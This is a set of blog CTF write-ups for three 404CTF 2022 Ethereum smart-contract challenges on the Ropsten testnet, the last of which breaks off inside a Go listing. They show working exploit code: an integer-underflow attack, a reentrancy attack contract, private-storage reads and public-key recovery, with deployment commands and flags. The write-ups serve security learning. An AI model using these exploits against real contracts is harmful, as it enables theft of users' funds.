[{"content":"Statement The challenge statement is as follows:\nAgent, nous avons découvert un smart contract de Hallebarde qui permet d\u0026rsquo;obtenir de l\u0026rsquo;argent gratuitement. Il sert également à s\u0026rsquo;authentifier en tant que nouveau membre de Hallebarde. Nous voulons que vous vous fassiez passer pour un de leurs membres. Nous avons récemment trouvé un endpoint qui semble leur servir de portail de connexion. Introduisez-vous dans leur système et récupérez toutes les informations sensibles que vous pourrez trouver.\nContrat à l\u0026rsquo;adresse : 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6\nRéseau de test Ropsten\nAuteur : Soremo\nnc challenge.404ctf.fr 30885\nThe source code of the smart contract is given:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 pragma solidity 0.7.6; contract FreeMoney { mapping (address =\u0026gt; uint256) balances; mapping(address =\u0026gt; uint256) lastWithdrawTime; mapping(address =\u0026gt; bool) isHallebardeMember; address private boss; constructor() public { boss = msg.sender; } function getMoney(uint256 numTokens) public { require(numTokens \u0026lt; 10000); require(block.timestamp \u0026gt;= lastWithdrawTime[msg.sender] + 365 days, \u0026#34;Vous devez attendre un an entre chaque demande d\u0026#39;argent.\u0026#34;); balances[msg.sender] += numTokens; lastWithdrawTime[msg.sender] = block.timestamp; } function reset() public { balances[msg.sender] = 0; lastWithdrawTime[msg.sender] = 0; } function transfer(address receiver, uint256 numTokens) public returns (bool) { require(balances[msg.sender] \u0026gt; 0); balances[msg.sender] -= numTokens; balances[receiver] += numTokens; return true; } function enterHallebarde() public { require(balances[msg.sender] \u0026gt; 100 ether || boss == msg.sender, \u0026#34;Vous n\u0026#39;avez pas assez d\u0026#39;argent pour devenir membre de Hallebarde.\u0026#34;); require(msg.sender != tx.origin || boss == msg.sender, \u0026#34;Soyez plus entreprenant !\u0026#34;); require(!isHallebardeMember[msg.sender]); isHallebardeMember[msg.sender] = true; } function getMembershipStatus(address memberAddress) external view returns (bool) { require(msg.sender == memberAddress || msg.sender == boss); return isHallebardeMember[memberAddress]; } } Exploitation The goal of the challenge is to execute the enterHallebarde() function without having the transaction being reverted and connect to challenge.404ctf.fr on port 30885 to give our address to get the flag.\nThere are two checks to pass in the enterHallebarde() function to succeed:\nThe sender\u0026rsquo;s balance must be greater than 100 ether or the sender is the owner of the contract. The sender must be different from the origin of the transaction or the sender must be the owner of the contract. First condition There are two functions that can increase the balance: getMoney() and transfer().\nWith getMoney() you can get only 10000 wei which corresponds to 0.00000000000001 ether (check with a converter online). This function can be called only once a year.\nThe transfer() function can be called to transfer money from the sender to another address. A first check is made to ensure that the sender has more than 0 ether. Then the sender\u0026rsquo;s balance is decreased by the amount of money to be transferred. The recipient\u0026rsquo;s balance is increased by the amount of money to be transferred. However, the balance is not compared to the number of tokens to be transferred.\nIn the situation where the sender have 1 wei and wants to transfer 2 wei to a random address, what will happen to our uint256 variable?\nThis is an integer underflow vulnerability. Our balance will be egal to the maximum value of an uint256 which is about 1.15e+59 ether.\nLet\u0026rsquo;s do it!\nThe environment has to be configured, the solc binary (version 0.7.6 to match the contract requirements) and abigen are needed.\n1 2 3 4 5 6 mkdir -p /tmp/challenge/FreeMoney cd $_ go mod init challenge cp /tmp/FreeMoney.sol /tmp/challenge/FreeMoney/ solc --abi FreeMoney.sol -o . abigen --abi=./FreeMoney.abi --pkg=freemoney --out=FreeMoney.go An optional but recommended step is to work on a fork of the blockchain for faster performance and easier debugging.\n1 2 3 npx hardhat node --fork https://ropsten.infura.io/v3/\u0026lt;APIKEY\u0026gt; #or anvil --fork-url https://ropsten.infura.io/v3/\u0026lt;APIKEY\u0026gt; And ctf-freemoney.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 package main import ( \u0026#34;context\u0026#34; \u0026#34;crypto/ecdsa\u0026#34; freemoney \u0026#34;challenge/FreeMoney\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/big\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/accounts/abi/bind\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/common\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/crypto\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/ethclient\u0026#34; ) var fork bool func main() { var blockchainURL, contractAddress, privateKey string _ = privateKey flag.BoolVar(\u0026amp;fork, \u0026#34;fork\u0026#34;, true, \u0026#34;Should we use the parameter for the fork blockchain ? (default: true)\u0026#34;) flag.Parse() contractAddress = \u0026#34;0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6\u0026#34; if fork { blockchainURL = \u0026#34;http://127.0.0.1:8545\u0026#34; privateKey = \u0026#34;59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d\u0026#34; } else { blockchainURL = \u0026#34;https://eth-rinkeby.alchemyapi.io/v2/\u0026lt;API-KEY\u0026gt;\u0026#34; privateKey = \u0026#34;\u0026lt;PRIVATE-KEY\u0026gt;\u0026#34; } // Connect to an ethereum node client, err := ethclient.Dial(blockchainURL) if err != nil { log.Fatal(err) } // Contract contractAddressHash := common.HexToAddress(contractAddress) instance, err := freemoney.NewFreemoney(contractAddressHash, client) // Get 1 wei // GetMoney is a write transaction and therefore need to be signed auth := newTransactor(client, privateKey) _, err = instance.GetMoney(auth, big.NewInt(1)) if err != nil { log.Fatal(\u0026#34;fail to get money \u0026#34;, err) } // Transfer 2 wei to a random address // Transfer is a write transaction and therefore need to be signed auth = newTransactor(client, privateKey) _, err = instance.Transfer(auth, common.HexToAddress(\u0026#34;0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266\u0026#34;), big.NewInt(2)) if err != nil { log.Fatal(\u0026#34;fail to get transfer \u0026#34;, err) } // EnterHallebarde // EnterHallebarde is a write transaction and therefore need to be signed auth = newTransactor(client, privateKey) _, err = instance.EnterHallebarde(auth) if err != nil { log.Fatal(\u0026#34;fail to enterHallebarde\u0026#34;, err) } } // newTransactor creates a transaction signer based on the provided private key func newTransactor(client *ethclient.Client, privateKeyStr string) *bind.TransactOpts { privateKey, err := crypto.HexToECDSA(privateKeyStr) if err != nil { log.Fatal(err) } publicKey := privateKey.Public() publicKeyECDSA, ok := publicKey.(*ecdsa.PublicKey) if !ok { log.Fatal(\u0026#34;cannot assert type: publicKey is not of type *ecdsa.PublicKey\u0026#34;) } fromAddress := crypto.PubkeyToAddress(*publicKeyECDSA) nonce, err := client.PendingNonceAt(context.Background(), fromAddress) if err != nil { log.Fatal(err) } gasPrice, err := client.SuggestGasPrice(context.Background()) if err != nil { log.Fatal(err) } //fmt.Println(\u0026#34;gasPrice:\u0026#34;, gasPrice) //fmt.Println(\u0026#34;nonce:\u0026#34;, nonce) auth := bind.NewKeyedTransactor(privateKey) auth.Nonce = big.NewInt(int64(nonce)) auth.Value = big.NewInt(0) // in wei auth.GasLimit = uint64(20000000) // in units auth.GasPrice = new(big.Int).Mul(gasPrice, big.NewInt(3)) // Increase gaz to improve speed as our guess depend of the block number return auth } Running the code should generate a revert with the message Soyez plus entreprenant !. This means, that we passed the first check that was require(balances[msg.sender] \u0026gt; 100 ether || boss == msg.sender, \u0026quot;Vous n'avez pas assez d'argent pour devenir membre de Hallebarde.\u0026quot;);.\nSecond condition To bypass this check, we need to understand tx.origin and msg.sender. According to the ethereum whitepaper:\nIn general, there are two types of accounts: externally owned accounts, controlled by private keys, and contract accounts, controlled by their contract code.\ntx.origin is the address of the externally owned accounts (or a wallet) that sent the transaction. msg.sender is the address of the account from which the call originated. It can be either an externally owned account or a contract account. By analogy with network address, tx.origin is like an IP address and msg.sender is like an arp address.\nThus, the condition msg.sender != tx.origin means that the transaction must come from a contract account. Basically, we have to do the previous part written in Golang in Solidity. :smile:.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \u0026#34;forge-std/Test.sol\u0026#34;; // The interface defining the function in the vulnerable contract that we want to call interface IFREE_MONEY { function enterHallebarde() external; function transfer(address receiver, uint256 numTokens) external; function getMoney(uint256 numTokens) external; function getMembershipStatus(address memberAddress) external returns (bool); } contract ContractTest is Test { // The target contract address public constant FREE_MONEY_CONTRACT = 0xb8c77090221FDF55e68EA1CB5588D812fB9f77D6; // setUp is a foundry function that is not needed here function setUp() public {} function freeMoneyPwn() public { IFREE_MONEY fm = IFREE_MONEY(FREE_MONEY_CONTRACT); // Call getMoney with 1 wei fm.getMoney(1); // Transfer 2 wei to a random address to trigger the underflow vulnerability fm.transfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 2); // EnterHallebarde fm.enterHallebarde(); // Check if we are a member, otherwise revert require(fm.getMembershipStatus(address(this)), \u0026#34;Not in membership\u0026#34;); } } I use Foundry introduce in the post Setting up the environment.\nThe above code can be tested on the fork with the command forge:\n1 forge run test/FreeMoney.t.sol --fork-url http://127.0.0.1:8545 --sig \u0026#34;freeMoneyPwn()\u0026#34; -vvvv No errors are returned. We can now deploy it on ropsten.\n1 forge create --rpc-url https://ropsten.infura.io/v3/\u0026lt;API KEY\u0026gt; --private-key \u0026lt;PRIVATE KEY\u0026gt; test/FreeMoney.t.sol:ContractTest 1 2 3 4 5 6 7 8 9 [⠘] Compiling... [⠃] Compiling 2 files with 0.8.13 [⠢] Compiling 2 files with 0.6.12 [⠑] Solc 0.6.12 finished in 155.95ms [⠊] Solc 0.8.13 finished in 2.56s Compiler run successful Deployer: 0xbafe3de2e4fbd28ce3d71db73b429cf13359f9e8 Deployed to: 0xbd5a2d122e606ba8e291db4da69fe879fed767e6 Transaction hash: 0xaf1231b3a5144264ac530f5409a5c68ce624c925792469ac29ee027893a66bcf And we can call the freeMoneyPwn() function:\n1 cast send 0xbd5a2d122e606ba8e291db4da69fe879fed767e6 \u0026#34;freeMoneyPwn()\u0026#34; --rpc-url https://ropsten.infura.io/v3/\u0026lt;API KEY\u0026gt; --private-key \u0026lt;PRIVATE KEY\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 blockHash 0xfed145a41b6b0980fac1c04792951c68b800efcbb837eae7365fc8d87ee37a67 blockNumber 12281762 contractAddress cumulativeGasUsed 833921 effectiveGasPrice 3000130589 gasUsed 116832 logs [] logsBloom 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 root status 1 transactionHash 0x3f26d603dc17454bd0fa0eb47c120b0e402c526ab1cda862694b53ea53f797ba transactionIndex 6 type 2 We can use the contract address to validate the challenge:\n1 2 3 4 5 6 7 8 9 10 11 nc challenge.404ctf.fr 30885 Si vous êtes un membre, appuyez sur entrée. Si vous êtes un VIP, rentrez votre pass : Nous allons maintenant vérifier que vous êtes bien un membre. Veuillez rentrer l\u0026#39;adresse ethereum avec laquelle vous êtes membre : 0xbd5a2d122e606ba8e291db4da69fe879fed767e6 Vérification en cours ... Bonjour membre, voici la preuve définitive que vous faites partie de Hallebarde : 404CTF{5M4r7_C0N7r4C7_1NC3P710N_37_UND3rF10W_QU01_D3_P1U5_F4C113} Faites attention, elle ne vous sera délivrée qu\u0026#39;une fois, ne la perdez pas ! The golang part was not necessary, but I wanted to show you how to use golang to interact with the contract.\nRecommendation To avoid such vulnerabilities, the safeMath library or the 0.8 branch of the solidity compiler should be used and the transfer() function should implement the appropriate require function.\n","date":"2022-06-10T00:00:00Z","image":"https://nodauf.dev/images/404CTF.png","permalink":"https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-1-web3/","title":"Writeup 404CTF 2022 - Contracts war 1 (web3)"},{"content":"Statement The challenge statement is as follows:\nAgent, maintenant que vous avez des compétences un peu plus approfondies en web3, nous aimerions faire appel à vos compétences dans une situation plus délicate. Nous avons décelé des traces d\u0026rsquo;activités suspectes à l\u0026rsquo;adresse 0xD5c0873f147cECF336fEEF1a28474716C745Df86. Hallebarde essaye apparemment de créer sa propre cryptomonnaie. De plus, il semble que les plus anciens membres de Hallebarde puissent récupérer une sorte de pass VIP. Utilisez ce pass pour obtenir des informations seulement connues par l\u0026rsquo;élite de Hallebarde.\nContrat à l\u0026rsquo;adresse : 0xD5c0873f147cECF336fEEF1a28474716C745Df86\nRéseau de test Ropsten\nAuteur : Soremo\nnc challenge.404ctf.fr 30885\nThe source code of the smart contract is given:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 pragma solidity 0.8.13; // solidity \u0026gt; 0.8.0 is using SafeMath by default. No integer underflow or overflow. interface IERC20 { function totalSupply() external view returns (uint256); function balanceOf(address account) external view returns (uint256); function allowance(address owner, address spender) external view returns (uint256); function transfer(address recipient, uint256 amount) external returns (bool); function approve(address spender, uint256 amount) external returns (bool); function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); event Approval(address indexed owner, address indexed spender, uint256 value); } contract HallebardeToken is IERC20 { using SafeMath for uint256; string public constant name = \u0026#34;Hallebarde\u0026#34;; string public constant symbol = \u0026#34;HLB\u0026#34;; uint8 public constant decimals = 18; mapping(address =\u0026gt; uint256) balances; mapping(address =\u0026gt; mapping (address =\u0026gt; uint256)) allowed; mapping(address =\u0026gt; uint256) seniority; mapping(address =\u0026gt; uint256) lastWithdrawTime; uint256 private vipPass; address private boss; uint256 totalSupply_; constructor(string memory _password) public { totalSupply_ = 1000000 ether; balances[msg.sender] = 1000 ether; balances[address(this)] = 999000 ether; seniority[msg.sender] = 10*365 days; boss = msg.sender; rand(_password); } function rand(string memory _password) public onlyOwner { vipPass = uint(keccak256(abi.encodePacked( msg.sender, block.timestamp, block.difficulty, vipPass, balances[address(this)], _password))); } function totalSupply() public override view returns (uint256) { return totalSupply_; } function balanceOf(address tokenOwner) public override view returns (uint256) { return balances[tokenOwner]; } function seniorityOf(address tokenOwner) public view returns (uint256) { return seniority[tokenOwner]; } // buyHLB to get HLB token. function buyHLB() public payable { require(msg.value \u0026gt; 0, \u0026#34;Vous avez besoin d\u0026#39;ethereum pour acheter des HLB.\u0026#34;); require(balances[address(this)] \u0026gt;= msg.value, \u0026#34;Il n\u0026#39;y a plus assez de HLB disponible. Revenez plus tard.\u0026#34;); balances[msg.sender] = balances[msg.sender].add(msg.value); balances[address(this)] = balances[address(this)].sub(msg.value); } // sellHLB to sell HLB token. We can sell token once per year. function sellHLB(uint256 numTokens) public { // Check if we have enough token to sell require(balances[msg.sender] \u0026gt;= numTokens); // Check the last time we sold HLB require(block.timestamp \u0026gt;= lastWithdrawTime[msg.sender] + 365 days, \u0026#34;Vous devez attendre un an entre chaque retrait.\u0026#34;); // Call the function transfer below to update the balance of the receiver and the sender. transfer(address(this), numTokens); // Update the seniroty of the user. The seniority is used to get the vip pass. seniority[msg.sender] = seniority[msg.sender].add(365 days); // Send ether to the remote address. The fallback function is used to send ether to the contract. (bool sent, ) = msg.sender.call{value: numTokens}(\u0026#34;\u0026#34;); require(sent, \u0026#34;Erreur lors de l\u0026#39;envoi de l\u0026#39;ethereum.\u0026#34;); // Update the last time we sold HLB. This is used to check if we can sell HLB again. lastWithdrawTime[msg.sender] = block.timestamp; } function transfer(address receiver, uint256 numTokens) public override returns (bool) { require(numTokens \u0026lt;= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(numTokens); balances[receiver] = balances[receiver].add(numTokens); emit Transfer(msg.sender, receiver, numTokens); return true; } function approve(address delegate, uint256 numTokens) public override returns (bool) { allowed[msg.sender][delegate] = numTokens; emit Approval(msg.sender, delegate, numTokens); return true; } function reset() external returns (string memory){ balances[msg.sender] = 0; seniority[msg.sender] = 0; lastWithdrawTime[msg.sender] = 0; return \u0026#34;Pas d\u0026#39;argent pour les impatients !\u0026#34;; } function allowance(address owner, address delegate) public override view returns (uint256) { return allowed[owner][delegate]; } function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) { require(numTokens \u0026lt;= balances[owner]); require(numTokens \u0026lt;= allowed[owner][msg.sender]); balances[owner] = balances[owner].sub(numTokens); allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens); balances[buyer] = balances[buyer].add(numTokens); emit Transfer(owner, buyer, numTokens); return true; } // senior function to get the vip pass. function senior() external view returns (uint256) { require(seniority[msg.sender] \u0026gt;= 10 * 365 days, \u0026#34;Revenez dans quelque temps.\u0026#34;); require(seniority[msg.sender] \u0026lt; 150 * 365 days, \u0026#34;Vous vous faites vieux, laissez-nous la place.\u0026#34;); return vipPass; } fallback () external payable { revert(); } modifier onlyOwner() { require(msg.sender == boss); _; } } // SafeMath to avoid integer underflow or overflow library SafeMath { function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b \u0026lt;= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c \u0026gt;= a); return c; } } Comment has been added on the function that will be exploited.\nExploitation VipPass By seeing this contract, the goal was pretty clear. We want to get the vip pass. One thing that should never be forgotten in solidity:\nNothing is private in smart contracts!\nThe public variable can be accessed easly with call instruction. In other hand, the private variable can be accessed only with the function rpc function eth_getStorageAt (the name may be different depending of the client). The slot storage are explains in depth in soliditylang.\nBasically, compare to other types, uint256 is easy to understand. Its position slot is the position of the declared variable (note that the mapping does not count). In our case uint256 private vipPass; is at position 4, the variable boss (the owner of the contract) is at position 5.\nTo access the variable vipPass, we will use cast from the foundry binaries:\n1 2 3 $ # cast storage \u0026lt;contract address\u0026gt; \u0026lt;slot number\u0026gt; $ cast storage 0xD5c0873f147cECF336fEEF1a28474716C745Df86 4 0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080 The function senior() returns the vipPass as an uint256 value. The cast storage command returns the value as a hexadecimal string. We can either use an online converter or solidity (with foundry dependencies).\n1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \u0026#34;forge-std/Test.sol\u0026#34;; contract ContractTest is Test { function convert() public { //address test = address(0x9A5a04eCC45BB46877ADcd1Fa4dB82C08D1bd080); //uint256 test2 = uint256(uint160(test)); uint256 test3 = 0x54be6df4fa514940682be41f9a5a04ecc45bb46877adcd1fa4db82c08d1bd080; emit log_named_uint(\u0026#34;test2: \u0026#34;, test3); } } This contract can be executed with the forge command:\n1 2 3 4 5 6 7 8 9 10 $ forge run test/Converter.t.sol --fork-url http://127.0.0.1:8545 --sig \u0026#34;convert()\u0026#34; [⠒] Compiling... [⠆] Compiling 6 files with 0.8.13 [⠰] Solc 0.8.13 finished in 2.05s Compiler run successful Script ran successfully. Gas used: 2108 == Return == == Logs == test2: : 38330739118242568697380065849010598905319469511070891991863930858741423657088 Unfortunately, the vipPass is not the only thing that is required, we need to have an address that is VIP:\n1 2 3 4 5 nc challenge.404ctf.fr 30885 Si vous êtes un membre, appuyez sur entrée. Si vous êtes un VIP, rentrez votre pass : 38330739118242568697380065849010598905319469511070891991863930858741423657088 Nous allons maintenant vérifier que vous êtes bien un vip. Veuillez rentrer l\u0026#39;adresse ethereum avec laquelle vous êtes vip : Pwning the contract To get VIP we have to pass two requires: require(seniority[msg.sender] \u0026gt;= 10 * 365 days, \u0026quot;Revenez dans quelque temps.\u0026quot;); and require(seniority[msg.sender] \u0026lt; 150 * 365 days, \u0026quot;Vous vous faites vieux, laissez-nous la place.\u0026quot;);.\nThe only function that update the seniroity mapping is function sellHLB(uint256 numTokens). This function can only be called once a year and if we have already some HLB tokens. Before updating the lastWithdrawTime variable to restrict the call to that function, the fallback to our contract is called, which can call the sellHLB(uint256 numTokens) function. In other words, we can call the function sellHLB(uint256 numTokens) multiple times before the lastWithdrawTime function is updated, this is a reentrency attack!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import \u0026#34;ds-test/test.sol\u0026#34;; import \u0026#34;forge-std/Test.sol\u0026#34;; interface IHallebardeToken { function sellHLB(uint256 numTokens) external; function seniorityOf(address tokenOwner) external view returns (uint256); function balanceOf(address tokenOwner) external returns (uint256); function buyHLB() external payable; function senior() external view returns (uint256); } contract TokenTest is Test { uint256 i = 0; IHallebardeToken ht = IHallebardeToken(address(0xD5c0873f147cECF336fEEF1a28474716C745Df86)); constructor() payable {} function pwn() public { ht.buyHLB{value: 12}(); ht.sellHLB(1); ht.senior(); } receive() external payable { emit log_named_uint( \u0026#34;seniority\u0026#34;, ht.seniorityOf(address(this)) / 365 days ); if (i \u0026lt;= 8) { i++; ht.sellHLB(1); } } } Running the above script with forge:\n1 forge run test/token.t.sol --fork-url http://127.0.0.1:8545 --sig \u0026#34;pwn()\u0026#34; -vvvv returns the following output:\nThis output is typical of a reentrancy attack.\nThe final step is to deploy our contract to the ropsten blockchain and execute the pwn function. While deploying, ether has to be sent to the contract.\n1 2 3 4 5 6 7 $ forge create --rpc-url https://ropsten.infura.io/v3/\u0026lt;API key\u0026gt; --private-key \u0026lt;private key\u0026gt; a4b7b56f3870d40feb26 test/token.t.sol:TokenTest --value 100 # value is required to send ether to the contract. Otherwise the buyHLB cannot work. ... Deployer: 0xbafe3de2e4fbd28ce3d71db73b429cf13359f9e8 Deployed to: 0x0afd7d482b51834b1cad91c313d21425f1ad3f61 Transaction hash: 0xa927b9bc266083aed45944efef8bd147ebd0a50e681bd32c473beb1d4e7e2c3 7 The function pwn can then be called.\n1 2 3 4 5 6 7 $ cast send 0x0afd7d482b51834b1cad91c313d21425f1ad3f61 \u0026#34;pwn()\u0026#34; --rpc-url https://ropsten.infura.io/v3/\u0026lt;API key\u0026gt; --private -key \u0026lt;private key\u0026gt; ... transactionHash 0x17621fe1437f1ec5e6f9533aaf864d7a60bae4d54293f21d5290982dc 42ea2bd ... The attack is successful and the seniority variable has been updated multiple times before the lastWithdrawTime got updated.\nWe can now validate the challenge by specifying our contract address.\n","date":"2022-06-10T00:00:00Z","image":"https://nodauf.dev/images/404CTF.png","permalink":"https://nodauf.dev/p/writeup-404ctf-2022-contracts-war-2-web3/","title":"Writeup 404CTF 2022 - Contracts war 2 (web3)"},{"content":"Statement The challenge statement is as follows:\nAgent, nous vous avons préparé un exercice pour vérifier votre compréhension de la blockchain.En effet, l\u0026rsquo;aspect pratique est important mais la partie théorique l\u0026rsquo;est tout autant.Essayez de récupérer cette clé publique.\nContrat à l\u0026rsquo;adresse : 0x9Eb8F52b22024003C1312ea1569cf14208f3c30A\nRéseau de test Ropsten\nAttention, ce challenge utilise une blockchain de test (réseau Ropsten). En AUCUN CAS vous ne devez utiliser de réelles cryptomonnaies pour ce challenge. Nous ne sommes pas responsables des éventuelles pertes que vous pourriez subir si vous le faites. Si vous possédez de réelles cryptomonnaies, nous vous conseillons fortement de créer un nouveau wallet séparé et dédié à ces challenges.\nThe source code of the smart contract is given:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 pragma solidity 0.8.13; contract publicKey{ address private secretAddress; constructor(address _secretAddress){ secretAddress = _secretAddress; } function isPublicKey(bytes memory mystery) external view returns(bool){ require(address(uint160(uint256(keccak256(mystery)))) == secretAddress, \u0026#34;Essayez encore !\u0026#34;); return true; } } Exploitation The source code is short and contains one variable and one function. Before explaining the source code when need to understand how the address, public key and private key work in Solidity.\nThere are three steps to generate a new wallet:\nFirst, a private key is generated, it is composed of 64 hexadecimal characters (i.e fad9c8855b740a0b7ed4c221dbad0f33a83a49cad6b3fe8d5817ac83d38b6a19). Then, from the private key with the algorithm ECDSA, the public key is generated, it is composed of 128 hexadecimal characters (i.e 9a7df67f79246283fdc93af76d4f8cdd62c4886e8cd870944e817dd0b97934fdd7719d0810951e03418205868a5c1b40b192451367f28e0088dd75e15de40c05). Sometimes the public key can be compressed to save memory space (source) Finally, the wallet address is generated from the public key. In solidity, this can be done as follows address(uint160(uint256(keccak256(publickey)))). This code takes the keccak256 hash of the public key and converts it to a 160-bit number. This number is then converted to a 20-byte address. For example, the keccack256 of the previous public key is 793d56a696967d8f0833fd6296216849c49358b10257cb55b28ea603c874b05e (several tools online can get the keccack256 hash). The address is the last 40 characters (96216849c49358b10257cb55b28ea603c874b05e) By knowing all this, the isPublicKey function takes a public key as parameter, get the address from it and compare it with the secretAddress variable.\nThe exploitation can be done in two steps.\nRetrieving the secretAddress variable In solidity contract nothing is really private. Even if the visibility of the variable has been set to private, the variable is still accessible. Web3 clients has a method called StorageAt (or something similar depending of the language) that can be used to retrieve a hex string at a specific slot in the contract. Beforehand, I forked the blockchain for faster performance and easier debugging.\n1 2 3 npx hardhat node --fork https://ropsten.infura.io/v3/\u0026lt;APIKEY\u0026gt; #or anvil --fork-url https://ropsten.infura.io/v3/\u0026lt;APIKEY\u0026gt; The storage can be retrieved with cast from foundry:\n1 2 cast storage 0x9Eb8F52b22024003C1312ea1569cf14208f3c30A 0 0x000000000000000000000000cf9a54585b20041ac1265ad64ce21d09fd4b1324 or in golang\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package main import ( \u0026#34;context\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;errors\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/big\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/common\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/crypto\u0026#34; \u0026#34;github.com/ethereum/go-ethereum/ethclient\u0026#34; ) var fork bool func main() { var blockchainURL, contractAddress string flag.BoolVar(\u0026amp;fork, \u0026#34;fork\u0026#34;, true, \u0026#34;Should we use the parameter for the fork blockchain ? (default: true)\u0026#34;) flag.Parse() contractAddress = \u0026#34;0x9Eb8F52b22024003C1312ea1569cf14208f3c30A\u0026#34; if fork { blockchainURL = \u0026#34;http://127.0.0.1:8545\u0026#34; } else { blockchainURL = \u0026#34;https://ropsten.infura.io/v3/\u0026lt;APIKEY\u0026gt;\u0026#34; } client, err := ethclient.Dial(blockchainURL) if err != nil { log.Fatal(err) } // Contract contractAddressHash := common.HexToAddress(contractAddress) storageContent, _ := client.StorageAt(context.Background(), contractAddressHash, common.BigToHash(big.NewInt(0)), nil) fmt.Println(\u0026#34;secretAddress:\u0026#34;, common.Bytes2Hex(storageContent)) } which returns the same value. We know that the secretAddress is 0xcf9a54585b20041ac1265ad64ce21d09fd4b1324.\nAn important thing about a transaction on the blockchain, is that each transaction is signed with the private key of the sender. The sender\u0026rsquo;s public key is also included in the signature. If the node is not able to verify the signature, it will not accept the transaction. At this point, if the address 0xcf9a54585b20041ac1265ad64ce21d09fd4b1324 has sent a transaction, we will be able to retrieve its public key. Lucky we are, it has sent four transactions (ropsten.etherscan.io). We need to recover the raw transaction that has been send by 0xcf9a54585b20041ac1265ad64ce21d09fd4b1324. For some unknown reason etherscan can\u0026rsquo;t retrieve the raw transaction.\nBut we can do it with any language with a web3 module.\n1 2 3 4 5 6 7 ... // Get the raw transaction in hex txHash := common.HexToHash(\u0026#34;0x3e641c314c4ffdfedad05dcee63910aa846711730b0c7366feb635b2e16b5cdb\u0026#34;) tx, _, _ := client.TransactionByHash(context.Background(), txHash) rawTXBytes, _ := tx.MarshalBinary() fmt.Println(\u0026#34;Raw data =\u0026gt;\u0026#34;, common.Bytes2Hex(rawTXBytes)) ... 1 Raw data =\u0026gt; f89702850ba43b7400831e84809465b38460c75a116f2b20f7bad96d2f1847db576288016345785d8a0000aa426f6e6e65206368616e636520706f75722074726f75766572206d6120636cc3a9207075626c697175651ba07f1e563c8c68bc5ef8e8556ef50d3d60159542a155f31602f0672b3f2b46a4a3a05c99f08fee4db681b60e0647a94fd9ae016476397d56b6c4d9afcc77615bb1e4 An online tool can do the math for us to retrieve the public key from the transaction.\nIn golang, no public function is available to recover the public key of a transaction. However, a private function in transaction_signing named recoverPlain return, from the raw transaction, the address of the sender after calculating the public key (I leave as an exercice for the reader to see how the internal works. The first called function is Sender of the london signer type)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 package main import ( \u0026#34;context\u0026#34; \u0026#34;errors\u0026#34; \u0026#34;flag\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; 